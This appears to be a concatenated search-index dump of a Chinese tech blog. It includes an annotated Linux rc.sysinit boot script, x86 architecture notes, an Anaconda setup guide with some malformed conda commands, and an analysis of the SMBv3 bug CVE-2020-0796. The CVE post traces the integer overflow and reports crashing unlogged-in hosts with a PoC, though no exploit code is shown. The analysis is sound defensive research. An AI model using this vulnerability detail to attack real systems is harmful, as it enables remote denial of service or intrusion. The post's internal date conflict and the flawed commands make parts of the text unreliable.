将开机过程中的相关信息写入到/var/log/dmesg文件中。 #!/bin/bash # # /etc/rc.d/rc.sysinit - run once at boot time # # Taken in part from Miquel van Smoorenburg's bcheckrc. # # 获取主机名 HOSTNAME=$(/bin/hostname) set -m # 如果存在/etc/sysconfig/network则执行 if [ -f /etc/sysconfig/network ]; then . /etc/sysconfig/network fi # 执行后HOSTNAME如果为空或“(none)”，则设置主机名为localhost if [ -z \"$HOSTNAME\" -o \"$HOSTNAME\" = \"(none)\" ]; then HOSTNAME=localhost fi # 挂在/proc和/sys，这样fsck才能使用卷标 if [ ! -e /proc/mounts ]; then mount -n -t proc /proc /proc # -n表示不写/etc/mtab，因为此时的/为只读 mount -n -t sysfs /sys /sys \u003e/dev/null 2\u003e\u00261 # 将/sys目录以sysfs格式挂载到/sys目录下 fi # 如果存在/prc/bus/usb目录，则挂载usbfs到usb下 if [ ! -d /proc/bus/usb ]; then modprobe usbcore \u003e/dev/null 2\u003e\u00261 \u0026\u0026 mount -n -t usbfs /proc/bus/usb /proc/bus/usb else mount -n -t usbfs /proc/bus/usb /proc/bus/usb fi # 挂载/etc/fstab文件中定义的所有文件系统 #remount /dev/shm to set attributes from fstab #669700 mount -n -o remount /dev/shm \u003e/dev/null 2\u003e\u00261 #remount /proc to set attributes from fstab #984003 mount -n -o remount /proc \u003e/dev/null 2\u003e\u00261 # 执行functions文件，该文件提供来很多有用的函数，具体内容可见参考文献5 . /etc/init.d/functions PLYMOUTH= [ -x /bin/plymouth ] \u0026\u0026 PLYMOUTH=yes # 在启动时显示一个动画 # 激活udev和selinux # 检查SELinux状态 SELINUX_STATE= if [ -e \"/selinux/enforce\" ] \u0026\u0026 [ \"$(cat /proc/self/attr/current)\" != \"kernel\" ]; then if [ -r \"/selinux/enforce\" ] ; then SELINUX_STATE=$(cat \"/selinux/enforce\") else # 如果无法成功读取，则直接置1 SELINUX_STATE=1 fi fi if [ -n \"$SELINUX_STATE\" -a -x /sbin/restorecon ] \u0026\u0026 __fgrep \" /dev \" /proc/mounts \u003e/dev/null 2\u003e\u00261 ; then /sbin/restorecon -R -F /dev 2\u003e/dev/null fi disable_selinux() { echo $\"*** Warning -- SELinux is active\" echo $\"*** Disabling security enforcement for system recovery.\" echo $\"*** Run 'setenforce 1' to reenable.\" echo \"0\" \u003e \"/selinux/enforce\" } relabel_selinux() { # if /sbin/init is not labeled correctly this process is running in the # wrong context, so a reboot will be required after relabel AUTORELABEL= . /etc/selinux/config echo \"0\" \u003e /selinux/enforce [ -n \"$PLYMOUTH\" ] \u0026\u0026 plymouth --hide-splash if [ \"$AUTORELABEL\" = \"0\" ]; then echo echo $\"*** Warning -- SELinux ${SELINUXTYPE} pol","date":"2020-10-13","objectID":"/2020/10/boot/:2:4","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"5. 启动终端，用户登录shell 这一步是用户登录shell过程 如果没有改变级别，默认情况执行/sbin/mingetty打开6个纯文本终端，让用户输入用户名和密码。输入完成后，再调用login程序，核对密码。如果密码正确，就从文件 /etc/passwd 读取该用户指定的shell，然后启动这个shell。 ","date":"2020-10-13","objectID":"/2020/10/boot/:2:5","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"参考链接 https://linux.cn/article-8807-1.html https://blog.51cto.com/zhang789/1851675 https://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html https://blog.51cto.com/433266/2173126 https://www.cnblogs.com/f-ck-need-u/p/7518142.html ","date":"2020-10-13","objectID":"/2020/10/boot/:3:0","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Linux"],"content":"Linux操作系统的大千世界 -- OS——x86架构","date":"2020-07-25","objectID":"/2020/07/x86/","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"Linux操作系统的大千世界——OS——x86架构 Linux操作系统的大千世界——OS——x86架构 ","date":"2020-07-25","objectID":"/2020/07/x86/:0:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"前言 完整的计算机由操作系统和硬件组成，必须两者兼备，而且两者要完美适配才能良好运作。操作系统的数量屈指可数，但是在操作系统下面的硬件却是千千万万。如何做到操作系统兼容各类各式的硬件环境呢？大家都协议一个通用的架构，大家都适配这个架构好了。于是，一个业内通用的架构——x86架构诞生了。 ","date":"2020-07-25","objectID":"/2020/07/x86/:1:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"一、计算机的工作模式 计算机的硬件根据功能划分成各自独立的产品，在进行组装时需要按照一定的顺序将复杂的设备和连接线安装好。如何安装我知道，但是为什么要这么安装呢？ 下图为一个硬件图和计算机的逻辑图，从这里我们可以大概看到计算机的工作模式： CPU，Central Processing Unit，计算机核心中的核心，所有设备的运作均围绕CPU展开。 总线，Bus，CPU连接其他设备时使用，即主板上数量庞大的集成电路，组成了CPU和其他设备的高速通信通道。 内存，Memory，保存CPU计算的中间结果，使得CPU在后续运算中可以使用临时保存的计算数据。 其他设备，显示器、磁盘、可移动存储介质等。 ","date":"2020-07-25","objectID":"/2020/07/x86/:2:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"1. CPU和内存如何进行配合？ CPU可以划分为3个单元：运算单元、数据单元和控制单元。运算单元专注计算，所使用的数据、计算的结果由数据单元保存（这里需要注意的一点是，虽然CPU可以通过内存总线与内存通信，计算使用的数据和计算结果可以保存在内存中，但是这样速度很慢，每次通过总线传输会很消耗时间，所以CPU内部专门开发了一个数据单元，保存临时、少量的计算数据，这样速度会大幅提升）。数据单元包括CPU内部的缓存和寄存器组，空间小，速度快，仅用于临时存放运算数据。控制单元则负责任务分发和调度，用于获取下一条指令，然后执行，会指导运算单元从数据单元中取出多少数据、怎样进行计算、计算结果放在数据单元的何处等。 程序运行后，每个进程会有自己独立的内存空间，例如图中进程A和进程B，互相隔离。程序的运行一般流程是开辟出一篇内存空间，程序的磁盘上的二进制文件被加载到内存空间中，形成代码段、数据段等。进程A和进程B在成功加载后，彼此的运行空间互相隔离，但是并不连续，这里的不连续是指分配的内存空间在物理上不一定是连续的，这主要与Linux操作系统的内存分配机制有关，后续会做详细深入分析。而且除了上图中的代码段和数据段，还会有其他的段。 程序运行中需要操作的数据和产生的运算结果，会存放在数据段中。CPU如何执行程序，操作这些数据，产生运算结果，并写回内存呢？ CPU的控制单元中有一个指令指针寄存器，保存了下一条指令在内存中的地址。控制单元会从代码段中不断获取指令的地址放入该进村其中，在执行时直接读取该寄存器，就可以知道下一条要执行的指令了。 指令一般分两部分，第一部分是做什么操作，第二部分是该操作要操作的数据。要执行这条指令，需要将第一部分交给运算单元，第二部分交给数据单元，数据单元根据数据的地址，从数据段里读到数据寄存器中，然后再参与运算。运算单元做完运算，产生的结果暂存在数据单元的数据寄存器中，等待指令将其写回到内存中的数据段中。 ","date":"2020-07-25","objectID":"/2020/07/x86/:2:1","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"2. 进程切换 上面所讲的各种操作均在进程A中进行，那么进程B呢？CPU里有两个专门的寄存器保存当前处理进程的代码段、数据段的起始地址。如果寄存器里保存的是进程A的地址，那么就执行进程A的指令；如果切换为进程B的地址，那么就执行进程B的指令，这个过程称为进程切换(Process Switch)。 进程切换是多任务系统的必备操作，后续会进行深入分析。 ","date":"2020-07-25","objectID":"/2020/07/x86/:2:2","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"3. 地址总线和数据总线 CPU和内存的数据传输主要靠总线，总线在整体上分为两类： 地址总线(Address Bus)，访问地址数据，即读取内存中何处的数据 数据总线(Data Bus)，读取到的数据 地址总线的位数，决定了能访问的地址范围。如何理解？例如总线只有2位，那么能访问的地址就为00、01、10、11这4个地址，如果是3位就可以访问8个地址，所以地址总线位数越多，能访问的地址范围就越广。 数据总线的位数，决定了一次可以读多少数据。如何理解？例如总线只有2位，那么CPU一次只能拿2位，想要拿8位，就需要读4次。所以数据总线位数越多，一次可以读取的数据就越多，访问速度也就越快。 ","date":"2020-07-25","objectID":"/2020/07/x86/:2:3","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"4. x86架构 x86泛指一系列基于[Intel 8086](https://baike.baidu.com/item/Intel 8086)且向后兼容的中央处理器指令集架构。最早的8086处理器于1978年由Intel推出，为16位微处理器。但是让x86真正得到推广的，是IBM。因为IBM的PC卖得太好，被起诉垄断，无奈之下公开了一些技术，这使得业内其他品牌逐步都开始采用IBM的“Intel 8088芯片+MS-DOS”的PC模式。Intel的技术因此成为了行业的开放事实标准。由于该系列开端与8086，因此称为x86架构。 虽然后来的Intel的CPU的数据总线和地址总线越来越宽，处理能力越来越强，但是始终坚持标准、开放、兼容的原则，因此构建了一个庞大的软硬件生态。 部分芯片和总线数据如下： 型号 总线位宽 地址位 寻址空间 8080 8 16 64k (2^16) 8086 16 20 1M (2^20) 8088 8 20 1M (2^20) 80386 32 32 4G (2^32) ","date":"2020-07-25","objectID":"/2020/07/x86/:2:4","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"三、8086的原理 x86中最经典的一款处理器就是8086处理器，至今为止很多操作系统仍然保持对该处理器的兼容性。 下图为CPU内部组件构成图： 数据单元，包含8个16位的寄存器：AX、BX、CX、DX、SP、BP、SI、DI。其中，AX、BX、CX、DX可以拆分成2个8位的寄存器使用：AH、AL、BH、BL、CH、CL、DH、DL。H代表High，表示高位，L代表Low，表示地位。这样以来，长数据可以直接使用完整的寄存器，而短数据也可以妥善处理。 控制单元，IP（Instruction Pointer Register）寄存器即指令指针寄存器，用于确定下一条指令的地址。CPU根据该寄存器不断将指令从内存的代码段中加载到指令队列里，然后交给运算单元执行。4个段寄存器，CS、DS、SS、ES寄存器，则用于进程切换中。CS指代码段寄存器（Code Segment Register），通过它可以找到代码在内存中的地址；DS是数据段寄存器，通过它可以找到数据在内存中的地址。SS是栈寄存器（Stack Segment Register），一般存放堆栈段的首地址，配合SP或BP使用，ES是附加段寄存器（Extra Segment）。当前面的段寄存器不够用时，可以使用ES寄存器。 进行运算时如何加载内存中的数据呢？ 通过DS确定数据段地址 通过寄存器确定偏移量（Offset），确定待用数据在段中的偏移（代码段的偏移量会存放在IP寄存器，数据段的偏移量存放在通用寄存器中） 通过\"起始地址 * 16 + 偏移量\"确定最终地址 这里需要注意，CS和DS均为16位，IP也是16位，即起始地址和偏移量都是16位，但是8086的地址总线时20位，所以需要通过上面的公式计算出最终的数据地址。 根据地址总线长度，8086的最大寻址能力为1M。且因为偏移量为16位，所以一个段的最大的大小为2^16=64K。 ","date":"2020-07-25","objectID":"/2020/07/x86/:3:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"四、32位处理器 核心就是扩展总线位宽，扩大内存。地址总线变为32根，寻址能力达到2^32=4G。如何使得硬件保持兼容呢？ 首先，扩展通用寄存器，将8个16位寄存器扩展为32位，但是依然可以保留16位和8位的使用方式（8位的使用只能在低位，如果高位也切割，就会不兼容）。IP寄存器扩展成32位，同时兼容16位。本质上，思想跟8086的思想是一样的，只是硬件做了升级。 回顾一下8086的寻址方式，20位地址的使用其实是有点尴尬的，结果还导致必须使用“起始地址 * 16 + 偏移量”的方式来计算实际地址。如果寄存器全部变成32位，4G的内存空间都可以访问到，是不是可以省去计算公式呢？ 在32位寄存器的系统中，CS、DS、SS、ES仍然为16位，但不再是段的起始地址。段的起始地址放在内存的某个地方，这个地方是一个表格，表格中的每一项都是一个段描述符（Segment Descriptor），段描述符中放的才是真正的段的起始地址。而段寄存器则存放具体是表格中的哪一项，称为选择子（Selector）。这样，就将从一个段寄存器直接获取段的起始地址，变成先间接地从段寄存器后的表格中的一项，然后从表格的一项中后去真正的段起始地址。实际上为了快速拿到段起始地址，段寄存器会从内存中拿到CPU的描述符高速缓存器中。（这个保存各个段的起始地址的表格其实是GDT（Global Descriptor Table，全局描述符表）和LDT（Local Descriptor Table，局部描述符表）） 32位这种设计方案的思想很值得大家好好琢磨，单纯地寻址总是要比计算+寻址地速度快的。个人认为，这种方案可以说纠正了20位地址总线的一种技术落后导致的设计错误，而且这种方案远远比20位的更灵活。 但是这样会导致不兼容问题的出现，怎么办？大的小的我都要。 32位架构下，出现了实模式（Real Pattern）和保护模式（Protect Pattern）。实模式就是前面的运行模式，保护模式就是后面的运行模式。在系统刚启动时，运行在实模式，运行成功后变为保护模式。这其实是一种通过切换模式实现兼容的方案。可见技术的发展，也影响着人的思想的发展。 ","date":"2020-07-25","objectID":"/2020/07/x86/:4:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"五、参考 专栏 – 《趣谈Linux操作系统》 ","date":"2020-07-25","objectID":"/2020/07/x86/:5:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- OS——x86架构","uri":"/2020/07/x86/"},{"categories":["Linux"],"content":"Linux操作系统的大千世界 -- 综述","date":"2020-07-24","objectID":"/2020/07/description/","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"Linux操作系统的大千世界 – 综述 Linux操作系统的大千世界 – 综述 ","date":"2020-07-24","objectID":"/2020/07/description/:0:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"前言 Linux操作系统，目前服务器领域体量最大的操作系统。之前学习操作系统时，并未单独对Linux操作系统进行深入的学习和理解，仅仅停留在常规使用和运维层面，而且只在需要时对部分功能和过程进行了深入的探索。在学习编程时，也并没有将Linux当作编程主力，当时还主要是在做Windows平台下的开发，因此对于Unix平台和类平台的编程开发能力相对较弱。基于以上两点，我觉得从头再完整过一遍Linux，将Linux相关内容整理成完整的知识体系架构。 学习过程中我会简单记录中间遇到的重点和问题，这些问题可能需要一定的基础才能理解，本系列部分内容可能对于新手并不友好（仅仅是部分内容，相信大部分大家还是都能看懂的）。 ","date":"2020-07-24","objectID":"/2020/07/description/:1:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"内容划分 目前计划将Linux相关内容整体上划分为两部分 – 操作系统和Unix编程（以Linux为开发平台），后续如果时间和精力允许的情况下，可能会更新部分Linux安全相关的内容 – 漏洞（偏分析）和攻防（偏技巧）。 操作系统部分会大致按照常规操作系统的课程来安排内容，中间会参考部分公开课和各种书籍、博客等，均会给出相关链接和引用说明，方便大家更好地找到资源。 Unix编程部分则会按照《Unix环境高级编程（第3版）》和《Unix网络编程》来安排内容，中间会对部分内容做扩充，也会对一些基础知识做裁剪，争取只保留干货和精华。 漏洞部分暂时的编排还没确定，主要担心时间精力不够，出现质量偏低的情况。但总原则是以漏洞分析为主，漏洞挖掘为补充。漏洞分析将会介绍规范化的漏洞分析流程，漏洞挖掘部分将介绍自己学习漏洞挖掘的过程。 攻防部分暂时的编排也没确定，总原则是以渗透和漏洞利用技巧为主，主要是做各种技巧的搜集整理。 ","date":"2020-07-24","objectID":"/2020/07/description/:2:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2020/07/description/"},{"categories":["Linux"],"content":"更新周期 更新时间不定，总原则是每周至少更新一次，争取一年内更新完操作系统部分和Unix编程的1/2内容。 最后，附上自己喜欢的一句话：人世纷乱，出入平安。 ","date":"2020-07-24","objectID":"/2020/07/description/:3:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2020/07/description/"},{"categories":["Misc"],"content":"Mac下的多版本Python管理实践","date":"2020-02-24","objectID":"/2020/02/anaconda3/","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"Mac下的多版本Python管理实践 Mac平台下多版本Python的管理实践 ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:0:0","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"前言 Mac系统自带一个Python2，但是在实际生产时现在越来越多使用Python3。如果直接在系统上添加一个Python3，非常不方便进行管理。在进行开发时，也需要进行相关配置才能明确使用的Python版本。经过多方式、多软件尝试，最终找到一种方便的Python版本管理方式。 ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:1:0","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"一、环境说明 首先系统自带一个Python2，然后使用HomeBrew安装了一个Python3。为了不影响系统的Python2的，需要再个人安装一个Python2和Python3。 ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:2:0","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"二、Anaconda3 ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:0","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"1. 选择理由 起初尝试过Pyenv，感觉还是比较麻烦，放弃了。尝试了目前网络上能找到的所有的版本管理方式，最终选择了Anaconda进行管理。 ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:1","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"2. 安装 1. HomeBrew安装 不使用图形化管理界面，可以直接使用HomeBrew进行安装。 Terminal输入： # 查看anaconda的位置 brew search anaconda 进行安装： brew install anaconda 以brew cask的方式开始进行安装，先下载文件，然后进行输入本机密码就可以开始进行安装。 安装完成后的环境配置： #使用bash echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.bash_profile source ~/.bash_profile #使用zsh echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.zshrc source ~/.zshrc 检查： conda --vesion 安装完成。 2. 官网安装 官网地址：Anaconda3 可以下载图形安装包，也可以下载命令行安装文件。如果是第一次使用建议先安装图形安装包，这样你可以清楚地看到每个python环境里安装了哪些包。熟悉了操作之后换成命令行即可。 1. 图形化安装 图形安装完成后的主界面： 进入到Environments选项中可以查看已安装的相关环境的详细信息： 这里anaconda3自带的环境名称为base，基于Python3，该环境中安装了Python常用的各种包，如果不是定制性有极强烈要求，可以使用该环境，能满足常见的各种开发要求，无需再自行配置开发环境。 2. 命令行安装 命令行安装方式是打开终端，执行下面的命令： Python2.7： $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python2版本 Python3.7： $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python3版本 后面路径为安装文件的目录。 提示“In order to continue the installation process, please review the license agreement.”，点击“Enter”查看“许可证协议”；滚动屏幕到最下方，输入”yes\"表示同意协议，安装继续。 提示“Press Enter to confirm the location, Press CTRL-C to cancel the installation or specify an alternate installation directory.”,如果接受默认安装路径，则显示“PREFIX=/home//anaconda\u003c2 or 3\u003e”并且继续安装。安装过程大约几分钟。建议直接使用默认安装路径。 提示“Do you wish the installer to prepend the Anaconda install location to PATH in your /home//.bash_profile ?”，是否自动添加环境变量到.bash_profile文件中，输入“yes\"，自动添加；输入”no\"，则需要自行手动添加。如果你使用的是zsh，需要在.zshrc文件中自行添加环境变量。 提示”Thank you for installing Anaconda!”,安装完成。 source一下或重启终端使新加的环境变量生效 source ~/.bash_profile # source ~/.zshrc ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:2","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"3. 卸载 ``` conda install anaconda-clean anaconda-clean #清除个人配置 rm -r /Users/XXXX/.anaconda_backup/... #删除备份，路径可能不同 rm -rf /anaconda3 vi ~/.bash_profile #删除环境变量 # vi ~/.zshrc zsh用户执行这一条 rm -rf ~/.condarc ~/.conda ~/.continuum #删除可能存在的隐藏文件 ``` ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:3","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"三、方案使用 不做任何设置的前提下，安装完anaconda后，会设置为自动启动anaconda环境，默认为base环境。对于是否设置自动启动anaconda环境可以使用如下命令进行更改： # 取消自动启动 conda config auto_activate_base false # 设置自动启动 conda condif auto_activate_base true anaconda常用的命令 #查看conda版本 conda --version #更新conda版本 conda update conda #查看安装了哪些依赖库 conda list #创建新的python环境 conda create --name myenv #创建特定python版本的环境 conda create -n myenv python=3.7 #创建新环境并指定包含的库 conda create -n myenv scipy #创建新环境病指定特定版本的库 conda create -n myenv scipy=0.15.0 #复制环境 conda create --name myclone --clone myenv #查看是不是复制成功了 conda info --envs #激活、进入某个环境 source activate myenv #退出环境 source deactivate #删除环境 conda remove --name myenv --all #查看当前的环境列表 conda info --envs conda env list #查看某个环境下安装的库 conda list -n myenv #查找包 conda search XXX #安装包 conda install XXX #更新包 conda update XXX #删除包 conda remove XXX #安装到指定环境 conda install -n myenv XXX ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:4:0","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"四、总结 Anaconda是我目前为止觉得最简单的Python管理实践方式，也可能是我对其他的了解不够深入。话说回来，适合自己的才是最好的，你觉得呢？ ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:5:0","tags":["Mac","Python"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Vuln"],"content":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796） ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:0:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"前言 北京时间2020.03.11日，互联网中泄漏了关于CVE-2020-0796的相关信息。在此前的微软3月份例行补丁日更新中，无意中泄漏了该漏洞的存在。该漏洞影响组件为SMBv3，在Windows 10 1903和Windows Server 1903之后的版本中存在，影响范围较广。目前尚未发现可利用EXP，但已有crash的PoC，需要积极应对。此外，该漏洞具有蠕虫传播特性，可以轻松进行蠕虫传播，需要高度重视。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:1:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"一、SMBv3组件介绍 SMB，服务器消息块，是一个网络通信协议，用于提供共享访问到文件、打印机和串行端口的节点之间的网络上。它还提供了经过身份验证的进程间通信机制。SMB的大多数用法涉及运行Microsoft Windows的计算机，在引入Active Directory之前被称为“ Microsoft Windows网络” 。相应的Windows服务是用于服务器组件的LAN Manager服务器和用于客户端组件的LAN Manager工作站。 Windows 10和Windows Server 2016引入了SMB 3.1.1 。除了在SMB3中添加的AES-128 CCM加密外，该版本还支持AES-128 GCM加密，并使用SHA-512哈希实现预认证完整性检查。当使用SMB 2.x和更高版本连接到客户端时，SMB 3.1.1还添加了必须进行的安全协商步骤。 在SMBv3中，有一项数据压缩功能，可以通过SMB进行压缩数据的传输。此次漏洞触发点就位于压缩数据的过程中。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:2:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"二、漏洞信息和描述 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:3:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"1. 漏洞文件 漏洞存在于srv2.sys文件中 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:3:1","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"2. 漏洞函数 该漏洞涉及到了多个函数： Srv2DecompressMessageAsync Srv2DecompressData Smb2GetHonorCompressionAlgOrder Smb2SelectCompressionAlgorithm Smb2ValidateCompressionCapabilities ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:3:2","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"1. 基础数据结构 这里主要看一下SMB2 COMPRESSION_TRANSFORM_HEADER结构： 首先，说明了结构使用的场景：客户端或服务器在发送压缩消息时使用SMB2 COMPRESSION_TRANSFORM_HEADER。此可选标头仅对SMB 3.1.1 dialect有效。 可以通过以下链接查看SMB 3.1.1 dialect 也就是说，在进行压缩数据传输时，底层使用的是SMB2的COMPRESSION_TRANSFORM_HEADER，但是会有SMB 3.1.1 dialect的验证特征。 然后，对以上各字段做简要说明： 字段 含义 ProtocolId (4 bytes) 协议标识符。该值必须设置为0x424D53FC，也以网络顺序表示为0xFC，“ S”，“ M”和“ B”。 OriginalCompressedSegmentSize (4 bytes) 未压缩数据段的大小（以字节为单位）。 CompressionAlgorithm (2 bytes) 此字段务必包含CompressionAlgorithms字段中指定的用于压缩SMB2消息的算法之一，“ NONE”除外。 Flags (2 bytes) 必须为2个特定值之一 Offset/Length (4 bytes) 如果在Flags字段中设置了SMB2_COMPRESSION_FLAG_CHAINED，则该字段必须解释为长度，压缩有效payload的长度（以字节为单位）；否则，该字段必须解释为偏移。 从此结构的末尾到压缩数据段开始的偏移量（以字节为单位）。 CompressionAlgorithms字段中指定的算法： Flags字段可选的固定值： 了解了以上数据结构，可以方便PoC构造和观察流量特征。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:1","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"2. 静态分析 srv2.sys文件拖入IDA，先观察函数实现： SMB首先调用srv2!Srv2ReceiveHandler函数接收数据包，并根据ProtocolId设置对应的处理函数： 如果判断数据包中为压缩的数据（ProtocolID = 0xfc4d5342），则调用处置函数–Srv2DecompressMessageAsync函数。 srv2!Srv2DecompressMessageAsync函数会继续调用 Srv2DecompressData函数： Srv2DecompressMessageAsync函数并不是实际处理压缩数据的函数，而是继续调用了Srv2DecompressData函数，跟进查看Srv2DecompressData函数： 在Srv2DecompressData函数中可以看到数据处理的部分：在进行buffer分配时，会调用 SrvNetAllocateBuffer进行分配。但是在调用时，并未对OriginalCompressedSegmentSize和Offset/Length的长度进行任何检查，对二者相加的和也未进行安全检查。此处就存在一个整数溢出，如果二者的和为一个特别大的值，会超出内存存储范围，值会变成一个很小的值。 srv2!Srv2DecompressData函数调用SmbCompressionDecompress函数，进而调用nt!RtlDecompressBufferXpressLz函数进行实际的数据解压过程。nt!RtlDecompressBufferXpressLz函数位于ntoskrnl.exe中，该函数实际进行的处理就是： 由上面的代码可以看到在进行数据解压缩时，首先进行smb compress协议数据包的解析，获取其中包含的需要解压缩的数据的大小，并和之前通过SrvNetAllocateBuffer分配的buffer的OriginalCompressedSegmentSize值进行比较，确认其大小不大于OriginalCompressedSegmentSize，然后进行内存拷贝。若v21大于OriginalCompressedSegmentSize，则返回0xC0000242错误。因为在2中进行内存分配时没有做长度检查，所以如果传入一个很大的OriginalCompressedSegmentSize值触发整数溢出，此时v21就可以设置一个极大值，但可以通过对decompress size的判断，最终调用qmemcpy拷贝一个极大的size导致缓冲区溢出。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:2","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"3. crash的PoC复现 首先是靶机只是开机，未登录的状态： 直接执行PoC，可以成功执行： 正常登录后的执行，只是正常登录，并未进行任何文件或文件夹的共享设置： 同样可以造成蓝屏： 所以，不管存在漏洞的系统是否登录、是否开启了共享，都可以正常执行PoC。联想到EXP，只要可以获取到受影响系统的IP地址，即可进行漏洞攻击。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:3","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"4. PoC代码分析 